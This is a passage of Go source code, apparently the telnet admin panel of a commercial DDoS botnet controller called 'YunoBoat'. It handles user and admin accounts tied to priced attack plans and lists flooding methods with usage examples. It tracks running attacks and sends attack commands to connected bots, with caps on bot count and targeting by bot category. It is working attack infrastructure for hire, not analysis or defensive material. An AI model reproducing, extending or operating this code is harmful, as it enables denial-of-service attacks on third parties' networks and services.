			return
		}
		name, pass := f[1], f[2]
		if pass == "-" {
			pass = strongPassword(24)
		}
		plan := "Power"
		if len(f) >= 4 {
			plan = f[3]
		}
		if err := store.CreateUser(name, pass, plan); err != nil {
			a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31m%s\x1b[0m\r\n", err.Error())))
			return
		}
		a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32muser created\x1b[0m \x1b[1;35m%s\x1b[0m \x1b[37mplan %s\x1b[0m\r\n  \x1b[37mpassword: \x1b[1;33m%s\x1b[0m\r\n  \x1b[37mapi key:  \x1b[1;33m%s\x1b[0m\r\n",
			name, plan, pass, store.APIKeyFor(name))))
	case "admin":
		if len(f) < 3 {
			a.conn.Write([]byte("\r\n\x1b[37musage: /user admin <name> <pass|->\x1b[0m\r\n"))
			return
		}
		name, pass := f[1], f[2]
		if pass == "-" {
			pass = strongPassword(24)
		}
		if err := store.CreateUser(name, pass, "admin"); err != nil {
			a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31m%s\x1b[0m\r\n", err.Error())))
			return
		}
		// Promote to admin.
		store.mu.Lock()
		if u, ok := store.Users[name]; ok {
			u.Admin = true
			u.Count = 0
			u.MaxDur = 21600
		}
		store.mu.Unlock()
		store.save()
		a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32madmin created\x1b[0m \x1b[1;35m%s\x1b[0m\r\n  \x1b[37mpassword: \x1b[1;33m%s\x1b[0m\r\n  \x1b[37mapi key:  \x1b[1;33m%s\x1b[0m\r\n",
			name, pass, store.APIKeyFor(name))))
	case "del", "rm", "remove":
		if len(f) < 2 {
			a.conn.Write([]byte("\r\n\x1b[37musage: /user del <name>\x1b[0m\r\n"))
			return
		}
		if store.RemoveUser(f[1]) {
			a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32muser %s removed\x1b[0m\r\n", f[1])))
		} else {
			a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31m%s doesn't exist\x1b[0m\r\n", f[1])))
		}
	default:
		a.conn.Write([]byte("\r\n\x1b[37musage: /user add|admin|del ...\x1b[0m\r\n"))
	}
}

// logLine appends one line to logs/<name> (login/command audit trail).
func logLine(name, msg string) {
	if err := os.MkdirAll("logs", 0755); err != nil {
		return
	}
	f, err := os.OpenFile("logs/"+name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "| %s | %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
}

func (a *Admin) methods() string {
	return renderMethods() +
		"\x1b[1;37m  ex: \x1b[0m\x1b[0;33mudp 1.2.3.4 80 60 size=1400 threads=32\x1b[0m\n" +
		"\x1b[1;37m  ex: \x1b[0m\x1b[0;33mtcpbypass 1.2.3.4 80 60 threads=16 domain=example.com\x1b[0m\r\n\r\n"
}

func (a *Admin) countText() string {
	var b bytes.Buffer
	for k, v := range clientList.Distribution() {
		b.WriteString(fmt.Sprintf("  \x1b[1;37m%s\x1b[0m: \x1b[1;31m%d\x1b[0m\r\n", k, v))
	}
	b.WriteString(fmt.Sprintf("  \x1b[1;37mTotal\x1b[0m: \x1b[1;31m%d\x1b[0m\r\n", clientList.Count()))
	return b.String()
}

func (a *Admin) runningText() string {
	var b bytes.Buffer
	b.WriteString("\r\n\x1b[1;36m== running attacks ==\x1b[0m\r\n")
	running := store.Running()
	if len(running) == 0 {
		b.WriteString("  \x1b[37mnone\x1b[0m\r\n")
		return b.String()
	}
	for _, r := range running {
		left := r.Duration - int(time.Now().Unix()-r.Start)
		b.WriteString(fmt.Sprintf("  \x1b[1;33m%s\x1b[0m \x1b[37m|\x1b[0m \x1b[1;35m%s\x1b[0m \x1b[37m|\x1b[0m \x1b[31m%ds left\x1b[0m \x1b[37m|\x1b[0m user:%s\r\n",
			r.Target, r.Method, left, r.User))
	}
	return b.String()
}

func (a *Admin) tariffsText() string {
	var b bytes.Buffer
	b.WriteString("\r\n\x1b[1;36m== plans ==\x1b[0m\r\n")
	for _, t := range tariffsDefault {
		cnt := "∞"
		if t.Count != 0 {
			cnt = strconv.Itoa(t.Count)
		}
		b.WriteString(fmt.Sprintf("  \x1b[1;35m%-11s\x1b[0m \x1b[1;33m%-6s\x1b[0m \x1b[37mcount:%s\x1b[0m \x1b[37mmax:%ds\x1b[0m\r\n",
			t.Name, t.Price, cnt, t.MaxDur))
	}
	return b.String()
}

func (a *Admin) setWindowTitle() {
	botCount := clientList.Count()
	if !a.user.Admin && a.user.Count > 0 && botCount > a.user.Count {
		botCount = a.user.Count
	}
	var title string
	if a.user.Admin {
		title = fmt.Sprintf("YunoBoat :: %d bots :: %d users :: %d running atk :: %d sents",
			botCount, store.UserCount(), len(store.Running()), store.TotalSent())
	} else {
		title = fmt.Sprintf("YunoBoat :: %d bots :: %d running atk", botCount, len(store.Running()))
	}
	// Send once only. OSC 0 is recognized by Kitty and does not interfere with
	// the input stream when it is not repeated by a background ticker.
	_, _ = a.conn.Write([]byte("\033]0;" + title + "\007"))
}

func (a *Admin) runAttack(cmd, user string) {
	// spoofed-style prefixes: -<N> caps the bot count, @<category> targets one
	// bot impl/region. Both are optional.
	botCount := -1
	if !a.user.Admin && a.user.Count > 0 {
		botCount = a.user.Count
	}
	botCategory := ""
	for {
		if strings.HasPrefix(cmd, "-") {
			split := strings.SplitN(cmd, " ", 2)
			if len(split) < 2 {
				break
			}
			n, err := strconv.Atoi(split[0][1:])
			if err != nil {
				break
			}
			if !a.user.Admin && a.user.Count > 0 && n > a.user.Count {
				n = a.user.Count
			}
			botCount = n
			cmd = split[1]
			continue
		}
		if strings.HasPrefix(cmd, "@") {
			split := strings.SplitN(cmd, " ", 2)
			if len(split) < 2 {
				break
			}
			botCategory = split[0][1:]
			cmd = split[1]
			continue
		}
		break
	}

	atk, err := NewAttack(cmd)
	if err != nil {
		a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31m%s\x1b[0m\r\n", err.Error())))
		return
	}
	buf, err := atk.Build()
	if err != nil {
		a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31m%s\x1b[0m\r\n", err.Error())))
		return
	}
	// Whitelist filter: an ip/domain on the list can't be attacked.
	if store.IsWhitelistedTarget(atk.Target) ||
		(atk.Domain != "" && store.IsWhitelistedTarget(atk.Domain)) {
		a.conn.Write([]byte(fmt.Sprintf(
			"\r\n\x1b[0;33m[filter] нельзя кинуть атаку на %s — цель находится в whitelist\x1b[0m\r\n",
			atk.Target)))
		return
	}
	// Tariff + single-concurrency gate.
	if ok, msg := store.CanLaunch(a.user, atk.Target, atk.Name, int(atk.Duration)); !ok {
		a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31m%s\x1b[0m\r\n", msg)))
		return
	} else {
		store.RegisterAttack(a.user, atk.Target, atk.Name, atk.Port(), int(atk.Duration))
	}
	hookAttackLaunch(a.user.Username, atk.Name, atk.Target, atk.Port(), int(atk.Duration))
	clientList.QueueBuf(buf, botCount, botCategory)
	sent := clientList.Count()
	if botCount > 0 && botCount < sent {
		sent = botCount
	}
	a.conn.Write([]byte(renderAttackBanner(atk, sent)))
}

// renderMethods prints the attack catalogue as two tight, aligned columns so a
// narrow telnet window reads cleanly ("minimal style").
func renderMethods() string {
	names := make([]string, 0, len(attackInfoLookup))
	for name := range attackInfoLookup {
		names = append(names, name)
	}
	sort.Strings(names)
	var b strings.Builder
	b.WriteString("\r\n\x1b[1;36m  methods\x1b[0m\r\n")
	col := 0
	for _, name := range names {
		info := attackInfoLookup[name]
		entry := fmt.Sprintf("\x1b[0;33m%-10s\x1b[0m %s", name, info.attackDescription)
		if col == 0 {
			b.WriteString("  " + entry)
		} else {
			b.WriteString("   " + entry)
		}
		col++
		if col == 1 {
			b.WriteString("\r\n")
			col = 0
		}
	}
	if col == 1 {
		b.WriteString("\r\n")
	}
	return b.String()
}

// renderAttackBanner prints a one-line, minimal attack header: target IP +
// live geo, method, port, duration and bot count.
func renderAttackBanner(atk *Attack, sent int) string {
	ip, cc := targetGeo(atk.Target) // may be a domain, resolved below
	port := atk.Port()
	portStr := ""
	if port > 0 {
		portStr = fmt.Sprintf(":%d", port)
	}
	ccStr := ""
	if cc != "" {
		ccStr = strings.ToUpper(cc)
	}
	var b strings.Builder
	b.WriteString("\r\n\x1b[1;32m┌ attack launched\x1b[0m\r\n")
	b.WriteString(fmt.Sprintf("\x1b[1;37m│  %-10s\x1b[0m \x1b[0;33m%s%s\x1b[0m", atk.Name, ip, portStr))
	if ccStr != "" {
		b.WriteString(fmt.Sprintf("\x1b[0;36m [%s]\x1b[0m", ccStr))
	}
	b.WriteString(fmt.Sprintf("\r\n\x1b[1;37m│  duration   \x1b[0m%d s", atk.Duration))
	b.WriteString(fmt.Sprintf("\r\n\x1b[1;37m│  bots       \x1b[0m%d\r\n", sent))
	b.WriteString("\x1b[1;32m└────────────\x1b[0m\r\n")
	return b.String()
}

// targetGeo resolves a target (ip or domain) to its first IPv4 and live
// country code. Domain->IP uses DNS; then the same API-backed countryCode()
// used for bot registration.
func targetGeo(target string) (string, string) {
	ip := target
	if parsed := net.ParseIP(target); parsed == nil {
		ips, err := net.LookupIP(target)
		if err == nil {
			for _, a := range ips {
				if v4 := a.To4(); v4 != nil {
					ip = v4.String()
					break
				}
			}
		}
	}
	return ip, countryCode(ip)
}

func (a *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	pos := 0
	for {
		ch, err := a.reader.ReadByte()
		if err != nil {
			return "", err
		}
		switch ch {
		case '\x7F', '\x08':
			if pos > 0 {
				pos--
				a.conn.Write([]byte("\b \b"))
			}
			continue
		case '\r', '\n':
			// SSH clients commonly send CRLF. Consume the LF paired with CR so
			// it cannot become an empty command on the next prompt.
			if ch == '\r' {
				if next, err := a.reader.Peek(1); err == nil && next[0] == '\n' {
					_, _ = a.reader.ReadByte()
				}
			}
			a.conn.Write([]byte("\r\n"))
			return string(buf[:pos]), nil
		case '\t':
			continue
		case '\x00':
			a.conn.Write([]byte("\r\n"))
			return string(buf[:pos]), nil
		case 0x03:
			a.conn.Write([]byte("^C\r\n"))
			return "", nil
		default:
			if ch == '\x1B' {
				// Ignore terminal escape sequences arriving from Kitty instead of
				// inserting their bytes into the command text.
				continue
			} else if masked {
				a.conn.Write([]byte("*"))
			} else {
				a.conn.Write([]byte{ch})
			}
		}
		if pos >= len(buf)-1 {
			return "", fmt.Errorf("input line too long")
		}
		buf[pos] = ch
		pos++
	}
}
